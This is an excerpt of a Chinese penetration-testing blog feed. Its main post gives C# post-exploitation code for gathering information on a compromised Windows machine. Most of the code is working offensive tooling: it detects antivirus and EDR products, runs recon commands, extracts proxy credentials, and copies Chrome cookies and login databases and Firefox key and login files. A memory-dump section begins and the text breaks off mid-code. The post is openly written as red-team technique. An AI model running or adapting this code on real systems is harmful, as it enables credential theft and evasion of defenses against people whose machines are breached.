的生成，可自行研究。</p><h3 id="4）更多"><a href="#4）更多" class="headerlink" title="4）更多"></a>4）更多</h3><p>更多内容请阅读文章底部的参考文章。</p><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://attack.mitre.org/techniques/T1137/" target="_blank" rel="noopener">Office Application Startup</a><br><a href="https://enigma0x3.net/2014/01/23/maintaining-access-with-normal-dotm/comment-page-1/" target="_blank" rel="noopener">MAINTAINING ACCESS WITH NORMAL.DOTM</a><br><a href="http://www.hexacorn.com/blog/2017/04/19/beyond-good-ol-run-key-part-62/" target="_blank" rel="noopener"><a href="http://www.hexacorn.com/blog/2017/04/19/beyond-good-ol-run-key-part-62/" target="_blank" rel="noopener">Beyond good ol’ Run key, Part 62</a></a><br><a href="https://labs.mwrinfosecurity.com/blog/add-in-opportunities-for-office-persistence/" target="_blank" rel="noopener">Add-In Opportunities for Office Persistence</a><br><a href="https://www.mdsec.co.uk/2019/05/persistence-the-continued-or-prolonged-existence-of-something-part-1-microsoft-office/" target="_blank" rel="noopener">Persistence: “the continued or prolonged existence of something”: Part 1 – Microsoft Office</a><br><a href="https://github.com/outflanknl/EvilClippy" target="_blank" rel="noopener">EvilClippy</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文是针对&lt;a href=&quot;https://github.com/RcoIl/Mind-Map/blob/master/Windows%E5%B8%B8%E8%A7%81%E6%8C%81%E4%B9%85%E6%8E%A7%E5%88%B6.png&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Windows常见持久控制&lt;/a&gt;的第一次说明。&lt;br&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="权限维持" scheme="https://rcoil.me/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>通过编程实现的本地机器信息收集</title>
    <link href="https://rcoil.me/2019/05/%E9%80%9A%E8%BF%87%E7%BC%96%E7%A8%8B%E5%AE%9E%E7%8E%B0%E7%9A%84%E6%9C%AC%E5%9C%B0%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>https://rcoil.me/2019/05/通过编程实现的本地机器信息收集/</id>
    <published>2019-05-11T10:52:59.000Z</published>
    <updated>2019-05-31T09:12:55.151Z</updated>
    
    <content type="html"><![CDATA[<p>每获取一台机器权限，如果每次都手动操作重复一样的信息收集工作，无疑加大了工作量。<br><a id="more"></a></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>可选用 <code>bat</code>、<code>C++</code>、<code>C#</code> 进行编写程序，前两者运行无条件限制，后者需要判断 <code>.NET</code> 版本，由于一直是对 <code>C#</code> 较感兴趣，所以使用后者进行编写，也可以直接使用 <code>execute-assembly</code> 执行。</p><p>本文多数模块取之文末的 <code>github</code> 项目。</p><h2 id="0x01-信息收集模块"><a href="#0x01-信息收集模块" class="headerlink" title="0x01 信息收集模块"></a>0x01 信息收集模块</h2><h3 id="1）安全产品检测"><a href="#1）安全产品检测" class="headerlink" title="1）安全产品检测"></a>1）安全产品检测</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">public static void AV_EDR()</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            /**- 获取进程信息</span><br><span class="line">             * - 枚举杀软进程列表（自定义列表）</span><br><span class="line">             * - 存在则输出</span><br><span class="line">             * - 代码实现</span><br><span class="line">             * - 参考：https://raw.githubusercontent.com/harleyQu1nn/AggressorScripts/master/AVQuery.cna</span><br><span class="line">            **/</span><br><span class="line">           string[] avproducts = &#123; &quot;Skynet&quot;,...., &quot;GDScan&quot; &#125;;</span><br><span class="line">            Process[] proces = Process.GetProcesses(Environment.MachineName);</span><br><span class="line">            Console.WriteLine(&quot;[+] Enumerating EDR products and Antivirus Processes on &quot; + Environment.MachineName + &quot;...&quot;);</span><br><span class="line">            Console.WriteLine(&quot;[+] Loaded &quot; + avproducts.Length + &quot; AV Process Names&quot;);</span><br><span class="line"></span><br><span class="line">            for (int i = 0; i &lt; proces.Length; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                for (int a = 0; a &lt; avproducts.Length; a++)</span><br><span class="line">                &#123;</span><br><span class="line">                    string processSearch = avproducts[a];</span><br><span class="line">                    if (proces[i].ProcessName.Equals(processSearch))</span><br><span class="line">                    &#123;</span><br><span class="line">                        Console.WriteLine(&quot;\t[!] Found AV Process: &quot; + proces[i].ProcessName);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            /**- 枚举列表（自定义列表）</span><br><span class="line">             * - 使用 File.Exists 检测文件是否存在</span><br><span class="line">             * - 存在则输出</span><br><span class="line">             * - 代码实现</span><br><span class="line">             * - 参考：https://raw.githubusercontent.com/harleyQu1nn/AggressorScripts/master/EDR.cna</span><br><span class="line">            **/</span><br><span class="line">            string[] edrproducts = &#123; &quot;CiscoAMPCEFWDriver.sys&quot;,...., &quot;amm6460.sys&quot; &#125;;</span><br><span class="line">            Console.WriteLine(&quot;[+] Loaded &quot; + edrproducts.Length + &quot; EDR Product Names&quot;);</span><br><span class="line">            string edrPath = @&quot;C:\Windows\System32\drivers\&quot;;</span><br><span class="line">            for (int e = 0; e &lt; edrproducts.Length; e++)</span><br><span class="line">            &#123;</span><br><span class="line">                if (File.Exists(edrPath + edrproducts[e]))</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(&quot;\t[!] EDR driver found &quot; + edrproducts[e]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="2）计算机架构"><a href="#2）计算机架构" class="headerlink" title="2）计算机架构"></a>2）计算机架构</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public static void Mains()</span><br><span class="line">        &#123;</span><br><span class="line">            /*</span><br><span class="line">             * - 直接使用 Environment</span><br><span class="line">             * - 参考：https://docs.microsoft.com/en-us/dotnet/api/system.environment?view=netframework-4.8</span><br><span class="line">             */</span><br><span class="line">            Console.WriteLine(&quot;[+] Environment members &quot;);</span><br><span class="line"></span><br><span class="line">            // 当前机器名</span><br><span class="line">            Console.WriteLine(&quot;\t[*] MachineName: &#123;0&#125;&quot;, Environment.MachineName);</span><br><span class="line">            // 当前用户名</span><br><span class="line">            Console.WriteLine(&quot;\t[*] UserName: &#123;0&#125;&quot;, Environment.UserName);</span><br><span class="line">            // 当前Domain名</span><br><span class="line">            Console.WriteLine(&quot;\t[*] UserDomainName: &#123;0&#125;&quot;, Environment.UserDomainName);</span><br><span class="line">            // 当前系统版本</span><br><span class="line">            Console.WriteLine(&quot;\t[*] OSVersion: &#123;0&#125;&quot;, Environment.OSVersion.ToString());</span><br><span class="line">            // 当前目录</span><br><span class="line">            Console.WriteLine(&quot;\t[*] CurrentDirectory: &#123;0&#125;&quot;, Environment.CurrentDirectory);</span><br><span class="line">            </span><br><span class="line">            // 盘符</span><br><span class="line">            string[] drives = Environment.GetLogicalDrives();</span><br><span class="line">            Console.WriteLine(&quot;\t[*] GetLogicalDrives: &#123;0&#125;&quot;, String.Join(&quot;, &quot;, drives));</span><br><span class="line">            // 当前程序名</span><br><span class="line">            string[] arguments = Environment.GetCommandLineArgs();</span><br><span class="line">            Console.WriteLine(&quot;\t[*] GetCommandLineArgs: &#123;0&#125;&quot;, String.Join(&quot;, &quot;, arguments));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="3-文件遍历"><a href="#3-文件遍历" class="headerlink" title="3) 文件遍历"></a>3) 文件遍历</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">直接利用bat执行就可以</span><br><span class="line">FOR /F &quot;Skip=1&quot; %%I in (&apos;wmic logicaldisk where &quot;Size&lt;&gt;null&quot; get name&apos;) Do (%%I &amp;&amp; dir /s /a %%I)</span><br></pre></td></tr></table></figure><h3 id="4-执行命令获取相关"><a href="#4-执行命令获取相关" class="headerlink" title="4) 执行命令获取相关"></a>4) 执行命令获取相关</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">// 运行基础命令查询</span><br><span class="line">        public static void GetBasisInfo()</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            /*</span><br><span class="line">             * - 获取系统基础信息</span><br><span class="line">            * - 管道没找到好的利用方式</span><br><span class="line">            * - 直接加载系统库，使用 system,此方法有个缺点，需要预分配内存，部分命令无法运行</span><br><span class="line">            * - 最后选择 ProcessStartInfo</span><br><span class="line">            */</span><br><span class="line">            </span><br><span class="line">            string[] commands = &#123;</span><br><span class="line">                &quot;systeminfo&quot;,</span><br><span class="line">                &quot;netstat -anop tcp&quot;,</span><br><span class="line">                &quot;ipconfig /all&quot;,</span><br><span class="line">                &quot;tasklist /v&quot;,</span><br><span class="line">                &quot;set&quot;,</span><br><span class="line">                &quot;query user&quot;,</span><br><span class="line">                &quot;net share&quot;,</span><br><span class="line">                // 自启动的程序</span><br><span class="line">                &quot;wmic startup list full&quot;,</span><br><span class="line">                // 查看分区</span><br><span class="line">                &quot;wmic logicaldisk where drivetype=3 get name,freespace,systemname,filesystem,volumeserialnumber,size&quot;,</span><br><span class="line">                // 判断 .NET 版本</span><br><span class="line">                &quot;dir %WINDIR%\\Microsoft.NET\\Framework\\v*&quot;,</span><br><span class="line">            &#125;;</span><br><span class="line">            foreach (string command in commands)</span><br><span class="line">            &#123;</span><br><span class="line">                string FileName = command.Replace(&quot;/&quot;, &quot;&quot;).Replace(&quot;-&quot;, &quot;&quot;).Replace(&quot;+&quot;, &quot;&quot;).Replace(&quot;%&quot;, &quot;&quot;).Replace(&quot;,&quot;, &quot;&quot;).Replace(&quot;=&quot;, &quot;&quot;).Replace(&quot;*&quot;, &quot;&quot;).Replace(&quot;\\&quot;, &quot;&quot;);</span><br><span class="line">                ProcessStartInfo proccessStartInfo = new ProcessStartInfo(&quot;cmd.exe&quot;, &quot; /c &quot; + command);</span><br><span class="line">                proccessStartInfo.CreateNoWindow = true;</span><br><span class="line">                Process proc = new Process &#123; StartInfo = proccessStartInfo &#125;;</span><br><span class="line"></span><br><span class="line">                proc.StartInfo.RedirectStandardOutput = true; // 由调用程序获取输出信息</span><br><span class="line">                proc.StartInfo.UseShellExecute = false; // 是否使用操作系统shell启动</span><br><span class="line">                proc.StartInfo.CreateNoWindow = true; // 不显示程序窗口</span><br><span class="line">                proc.Start(); // 启动程序</span><br><span class="line">                string outlist = proc.StandardOutput.ReadToEnd();</span><br><span class="line">                TxtWriter(outlist, FileName);</span><br><span class="line">                proc.WaitForExit(); // 等待程序执行完退出进程</span><br><span class="line">                proc.Close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="5-程序安装及版本"><a href="#5-程序安装及版本" class="headerlink" title="5) 程序安装及版本"></a>5) 程序安装及版本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">// 查找安装程序及版本</span><br><span class="line">        public static void GetInstalledApplications()</span><br><span class="line">        &#123;</span><br><span class="line">            /*</span><br><span class="line">             * - 从注册 Uninstall 表项中提取相关信息，进行筛选</span><br><span class="line">             */</span><br><span class="line">            string basekey = &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall&quot;;</span><br><span class="line">            RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(basekey);</span><br><span class="line">            if (registryKey != null)</span><br><span class="line">            &#123; // This key exists</span><br><span class="line">                foreach (string rname in registryKey.GetSubKeyNames())</span><br><span class="line">                &#123;</span><br><span class="line">                    RegistryKey installedapp = registryKey.OpenSubKey(rname);</span><br><span class="line">                    if (installedapp != null)</span><br><span class="line">                    &#123;</span><br><span class="line">                        string displayname = (installedapp.GetValue(&quot;DisplayName&quot;) != null) ? installedapp.GetValue(&quot;DisplayName&quot;).ToString() : &quot;&quot;;</span><br><span class="line">                        string displayversion = (installedapp.GetValue(&quot;DisplayVersion&quot;) != null) ? installedapp.GetValue(&quot;DisplayVersion&quot;).ToString() : &quot;&quot;;</span><br><span class="line">                        string helplink = (installedapp.GetValue(&quot;HelpLink&quot;) != null) ? installedapp.GetValue(&quot;HelpLink&quot;).ToString() : &quot;&quot;;</span><br><span class="line"></span><br><span class="line">                        if (!(Regex.IsMatch(displayname, &quot;^(Service Pack \\d+|(Definition\\s|Security\\s)?Update) for&quot;) &amp;&amp; Regex.IsMatch(helplink, &quot;support\\.microsoft&quot;)) &amp;&amp; displayname != &quot;&quot;)</span><br><span class="line">                        &#123;</span><br><span class="line">                            if (displayversion != &quot;&quot;)</span><br><span class="line">                            &#123;</span><br><span class="line">                                //Console.Out.WriteLine(&quot;\t[*] &quot; + displayname + &quot; (&quot; + displayversion + &quot;)&quot;);</span><br><span class="line">                                string displaynameversion = displayname + &quot; (&quot; + displayversion + &quot;)&quot;;</span><br><span class="line">                                TxtWriter(displayname, &quot;查找安装程序及版本&quot;);</span><br><span class="line">                            &#125;</span><br><span class="line">                            else</span><br><span class="line">                            &#123;</span><br><span class="line">                                //Console.Out.WriteLine(&quot;\t[*] &quot; + displayname);</span><br><span class="line">                                TxtWriter(displayname, &quot;查找安装程序及版本&quot;);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;                 </span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            basekey = &quot;Software\\Microsoft\\Installer\\Products&quot;;</span><br><span class="line">            registryKey = Registry.CurrentUser.OpenSubKey(basekey);</span><br><span class="line">            if (registryKey != null)</span><br><span class="line">            &#123;</span><br><span class="line">                foreach (string rname in registryKey.GetSubKeyNames())</span><br><span class="line">                &#123;</span><br><span class="line">                    RegistryKey installedapp = registryKey.OpenSubKey(rname);</span><br><span class="line">                    if (installedapp != null)</span><br><span class="line">                    &#123;</span><br><span class="line">                        string displayname = (installedapp.GetValue(&quot;ProductName&quot;) != null) ? installedapp.GetValue(&quot;ProductName&quot;).ToString() : &quot;&quot;;</span><br><span class="line">                        if (displayname != &quot;&quot;)</span><br><span class="line">                            //Console.Out.WriteLine(&quot;\t[*] &quot; + displayname);</span><br><span class="line">                            TxtWriter(displayname, &quot;查找安装程序及版本&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="6-最近浏览的文件"><a href="#6-最近浏览的文件" class="headerlink" title="6) 最近浏览的文件"></a>6) 最近浏览的文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">public static void Recent()</span><br><span class="line">        &#123;</span><br><span class="line">            /*</span><br><span class="line">             * - 最近预览的文件</span><br><span class="line">             * - 在 Tools 有朋友发过类似的 bat 脚本，实现原理是遍历用户目录下的lnk和url文件，然后调用vbs脚本获取快捷方式所指向的文件或者网址</span><br><span class="line">             * - 参考：https://www.t00ls.net/articles-46152.html</span><br><span class="line">             */</span><br><span class="line">            string userPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);</span><br><span class="line">            string recents = @&quot;Microsoft\Windows\Recent&quot;;</span><br><span class="line">            string recentsPath = Path.Combine(userPath, recents);</span><br><span class="line">            DirectoryInfo di = new DirectoryInfo(recentsPath);</span><br><span class="line">            //Console.WriteLine(&quot;[+] Recent Items in &quot; + recentsPath);</span><br><span class="line">            foreach (var file in di.GetFiles())</span><br><span class="line">            &#123;</span><br><span class="line">                TxtWriter(file.Name, &quot;最近预览的文件&quot;);</span><br><span class="line">                //Console.WriteLine(&quot;\t[*] &quot; + file.Name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="7-网络代理信息"><a href="#7-网络代理信息" class="headerlink" title="7) 网络代理信息"></a>7) 网络代理信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">public static void GetProxyInformation()</span><br><span class="line">        &#123;</span><br><span class="line">            /*</span><br><span class="line">             * - GetSystemWebProxy() 返回使用当前模拟用户的 Internet Explorer 设置配置的代理</span><br><span class="line">             * - 使用代理访问 google.com 进行确认</span><br><span class="line">             * - 如果存在验证情况，则将相关信息进行输出</span><br><span class="line">             */</span><br><span class="line">            IWebProxy wp = WebRequest.GetSystemWebProxy();</span><br><span class="line">            string url = &quot;https://www.google.com&quot;;</span><br><span class="line">            Uri req = new Uri(url);</span><br><span class="line">            //Console.Out.WriteLine(&quot;[+] URL Requested: &quot; + req.AbsoluteUri);</span><br><span class="line">            Uri proxy = wp.GetProxy(req);</span><br><span class="line">            if (String.Compare(req.AbsoluteUri, proxy.AbsoluteUri) != 0)</span><br><span class="line">            &#123;</span><br><span class="line">                //Console.Out.WriteLine(&quot;\t[*] Proxy: DIRECT&quot;);</span><br><span class="line">                TxtWriter(proxy.AbsoluteUri, &quot;网络代理情况&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            else if (wp.Credentials != null)</span><br><span class="line">            &#123;</span><br><span class="line">                NetworkCredential cred = wp.Credentials.GetCredential(req, &quot;basic&quot;);</span><br><span class="line">                string[] cerd = &#123; cred.UserName, cred.Password, cred.Domain &#125;;</span><br><span class="line">                foreach (string cers in cerd)</span><br><span class="line">                &#123;</span><br><span class="line">                    TxtWriter(cers, &quot;网络代理情况&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="8-浏览器相关文件"><a href="#8-浏览器相关文件" class="headerlink" title="8) 浏览器相关文件"></a>8) 浏览器相关文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">// 获取 Chrome 相关</span><br><span class="line">        public static void ChromeLocation()</span><br><span class="line">        &#123;</span><br><span class="line">            string localAppData = Environment.GetEnvironmentVariable(&quot;USERPROFILE&quot;);</span><br><span class="line">            string ChromeBasePath = String.Format(&quot;&#123;0&#125;\\AppData\\Local\\Google\\Chrome&quot;, localAppData);</span><br><span class="line"></span><br><span class="line">            if (Directory.Exists(ChromeBasePath))</span><br><span class="line">            &#123;</span><br><span class="line">                // 获取 Chrome 浏览器相关文件路径</span><br><span class="line">                string ChromeHistoryPath = String.Format(&quot;&#123;0&#125;\\User Data\\Default\\History&quot;, ChromeBasePath);</span><br><span class="line">                string ChromeBookmarkPath = String.Format(&quot;&#123;0&#125;\\User Data\\Default\\Bookmarks&quot;, ChromeBasePath);</span><br><span class="line">                string ChromeCookiesPath = String.Format(&quot;&#123;0&#125;\\User Data\\Default\\Cookies&quot;, ChromeBasePath);</span><br><span class="line">                string ChromeLoginDataPath = String.Format(&quot;&#123;0&#125;\\User Data\\Default\\Login Data&quot;, ChromeBasePath);</span><br><span class="line">                string[] ChromePaths = &#123; ChromeHistoryPath, ChromeBookmarkPath, ChromeCookiesPath, ChromeLoginDataPath &#125;;</span><br><span class="line">                // 创建文件夹、判断文件是否存在</span><br><span class="line">                string FilePath = CreateBrowserDirectory(&quot;\\Chrome&quot;);</span><br><span class="line">                foreach (string filePath in ChromePaths)</span><br><span class="line">                &#123;</span><br><span class="line">                    if (File.Exists(filePath))</span><br><span class="line">                    &#123;</span><br><span class="line">                        var FileName = filePath.Substring(filePath.LastIndexOf(&apos;\\&apos;));</span><br><span class="line">                        File.Copy(filePath, FilePath + FileName);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(&quot;[+] Not Chrome Directory&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        // 获取 Friefox 相关</span><br><span class="line">        public static void FroefoxLocation()</span><br><span class="line">        &#123;</span><br><span class="line">            // 获取 Friefox 浏览器目录</span><br><span class="line">            string localAppData = Environment.GetEnvironmentVariable(&quot;USERPROFILE&quot;);</span><br><span class="line">            string FirefoxBasePath = String.Format(&quot;&#123;0&#125;\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\&quot;, localAppData);</span><br><span class="line">            if (Directory.Exists(FirefoxBasePath))</span><br><span class="line">            &#123;</span><br><span class="line">                // 获取 Friefox 浏览器相关文件路径</span><br><span class="line">                string[] directories = Directory.GetDirectories(FirefoxBasePath);</span><br><span class="line">                foreach (string directory in directories)</span><br><span class="line">                &#123;</span><br><span class="line">                    string FirefoxPlaces = string.Format(&quot;&#123;0&#125;\\&#123;1&#125;&quot;, directory, &quot;places.sqlite&quot;);</span><br><span class="line">                    string FirefoxCer_1 = String.Format(&quot;&#123;0&#125;\\&#123;1&#125;&quot;, directory, &quot;cert8.db&quot;);</span><br><span class="line">                    string FirefoxCer_2 = String.Format(&quot;&#123;0&#125;\\&#123;1&#125;&quot;, directory, &quot;cert9.db&quot;);</span><br><span class="line">                    string FirefoxKey_1 = String.Format(&quot;&#123;0&#125;\\&#123;1&#125;&quot;, directory, &quot;key3.db&quot;);</span><br><span class="line">                    string FirefoxKey_2 = String.Format(&quot;&#123;0&#125;\\&#123;1&#125;&quot;, directory, &quot;key4.db&quot;);</span><br><span class="line">                    string FirefoxLogon = String.Format(&quot;&#123;0&#125;\\&#123;1&#125;&quot;, directory, &quot;logins.json&quot;);</span><br><span class="line">                    string[] FirefoxPaths = &#123; FirefoxPlaces, FirefoxCer_1, FirefoxCer_2, FirefoxKey_1, FirefoxKey_2, FirefoxLogon &#125;;</span><br><span class="line">                    // 创建文件夹、判断文件是否存在</span><br><span class="line">                    string FilePath = CreateBrowserDirectory(&quot;\\Friefox&quot;);</span><br><span class="line">                    foreach (string filePath in FirefoxPaths)</span><br><span class="line">                    &#123;</span><br><span class="line">                        if (File.Exists(filePath))</span><br><span class="line">                        &#123;</span><br><span class="line">                            var FileName = filePath.Substring(filePath.LastIndexOf(&apos;\\&apos;));</span><br><span class="line">                            File.Copy(filePath, FilePath + FileName);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(&quot;[+] Not Friefox Directory&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="9-MiniDump"><a href="#9-MiniDump" class="headerlink" title="9) MiniDump"></a>9) MiniDump</h3><p>直接取用<code>SharpDump</code>，需要高权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 